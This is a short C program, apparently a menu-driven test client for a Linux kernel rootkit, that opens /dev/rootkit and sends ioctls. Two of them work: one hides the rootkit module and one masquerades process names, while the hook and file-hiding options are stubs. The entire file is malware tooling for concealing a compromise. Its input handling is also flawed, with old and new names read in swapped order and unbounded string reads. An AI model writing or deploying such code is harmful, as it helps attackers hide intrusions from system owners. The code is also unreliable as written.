#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdio.h>
#include <stdlib.h>
#include "rootkit.h"

int main()
{
	int fd;
	int choice;
	struct masq_proc_req req;

	fd = open("/dev/rootkit", O_RDWR);
	if (fd < 0) {
		printf("Open rootkit fail\n");
		return 0;
	}

	while (1) {
		printf("Which test do you want to perform?\n");
		printf("1) IOCTL_MOD_HOOK\n");
		printf("2) IOCTL_MOD_HIDE\n");
		printf("3) IOCTL_MOD_MASQ\n");
		printf("4) IOCTL_FILE_HIDE\n");
		scanf("%d", &choice);

		switch (choice) {
		case 1:
			break;
		case 2:
			ioctl(fd, IOCTL_MOD_HIDE);
			break;
		case 3:
			printf("Please enter the number of the requests\n");
			scanf("%lu", &req.len);
			req.list = malloc(sizeof(*req.list) * req.len);
			for (int i = 0; i < req.len; i++) {
				printf("Please enter the [old_name] [new_name]\n");
				scanf("%s %s", req.list[i].new_name, req.list[i].orig_name);
			}
			ioctl(fd, IOCTL_MOD_MASQ, &req);
			break;
		case 4:
			break;
		default:
			printf("Please enter a valid command\n");
		}
	}

	return 0;
}
